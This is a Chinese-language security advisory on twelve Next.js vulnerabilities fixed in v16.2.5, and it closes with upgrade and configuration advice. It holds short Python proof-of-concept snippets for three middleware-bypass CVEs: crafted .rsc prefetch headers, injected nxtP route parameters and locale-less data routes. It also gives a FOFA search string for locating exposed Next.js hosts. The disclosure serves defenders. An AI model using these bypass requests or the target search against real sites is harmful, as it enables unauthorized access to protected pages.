**严重程度：** High
**CVSS：** 7.5 ~ 8.1（6 个 High，4 个 Moderate，2 个 Low）
**影响版本：** Next.js v16.0.0 ~ v16.2.4
**公开日期：** 2026-05-07
**修复版本：** Next.js >= 16.2.5

### 漏洞描述
Next.js v16.2.5 一次性修复了 **12 个安全漏洞**，这是 Next.js 历史上最大规模的安全更新。ProjectDiscovery 的 Neo 工具通过补丁差分和提交考古，逆向工程了全部 12 个漏洞的 PoC。

核心攻击面是**请求路由层** — 中间件匹配正则与内部数据获取器之间的规范化差异，导致中间件被绕过，受保护路由可被未认证访问。

### 关键漏洞分析

#### 🔴 CVE-2026-44575 — App Router Prefetch 中间件绕过 (CVSS 7.5)
Next.js 编译 `middleware.ts` 的 `matcher` 配置为正则，但该正则只覆盖标准路径和 Pages-Router 数据变体（`.json`），**不覆盖 App-Router 传输变体**：
- `*.rsc`（全路由预取）
- `*.segments/$c$children/__PAGE__.segment.rsc`（分段预取）

攻击者发送带 `RSC: 1` 和 `Next-Router-Prefetch: 1` 头的请求即可绕过中间件认证。

```python
# CVE-2026-44575 PoC — 中间件绕过
import urllib.request

target = "http://localhost:3000"
protected = "/dashboard"

# 正常请求被中间件拦截
req = urllib.request.Request(target + protected)
# → 302 Redirect

# 使用 .rsc 后缀绕过
req = urllib.request.Request(target + protected + ".rsc", headers={
    "RSC": "1",
    "Next-Router-Prefetch": "1",
    "Next-Router-State-Tree": '["",{}]',
    "Accept": "text/x-component",
})
# → 200 OK，返回受保护页面内容
```

#### 🔴 CVE-2026-44574 — 动态路由参数注入 (CVSS 8.1)
Next.js 使用内部搜索参数 `nxtP<name>`（路径）和 `nxtI<name>`（拦截）表示动态路由参数。攻击者可在公共路径上注入这些参数，使中间件看到安全路径，而 App Router 渲染受保护的动态路由页面。

```python
# CVE-2026-44574 PoC — 参数注入绕过
import urllib.parse

qs = urllib.parse.urlencode({
    "nxtPslug": "secret-page",
    "__nextDefaultLocale": "",
    "__nextLocale": "",
})
url = f"{target}/safe?{qs}"
# 中间件看到 /safe，App Router 渲染 /admin/[slug]
```

#### 🔴 CVE-2026-44573 — Pages Router i18n 数据路由绕过 (CVSS 7.5)
Pages-Router 应用的 `i18n` 配置暴露数据路由：
- 中间件只识别 `/_next/data/<buildId>/<locale>/<page>.json`
- 无 locale 变体 `/_next/data/<buildId>/<page>.json` 绕过中间件

```python
# CVE-2026-44573 PoC — i18n 数据路由绕过
url = f"{target}/_next/data/{build_id}/secret.json"
headers = {"x-nextjs-data": "1"}
# 中间件不触发，返回受保护页面的 JSON 数据
```

#### 🟠 CVE-2026-44580 — next/script beforeInteractive XSS (Moderate)
`<Script strategy="beforeInteractive">` 的 props 被 JSON 序列化到内联 `<script>` 标签中，但未转义 `<`、`>` 字符，导致 HTML tokenizer 级别的 XSS 注入。

#### 🟡 CVE-2026-23870 — RSC Server-Action DoS (CVSS 7.5)
向 Next.js server-action 端点发送深度循环的 RSC reply payload，React 无限制遍历循环，导致 CPU 耗尽/栈溢出。

### FOFA 感纹
`app="Next.js"`

### 修复建议
1. 升级到 Next.js >= 16.2.5
2. 检查中间件 matcher 配置是否覆盖 `.rsc` 和 `.segments/` 路径
3. 审查 Pages Router 的 `i18n` 配置
4. 自托管用户特别注意 WebSocket 升级路径（CVE-2026-44578）
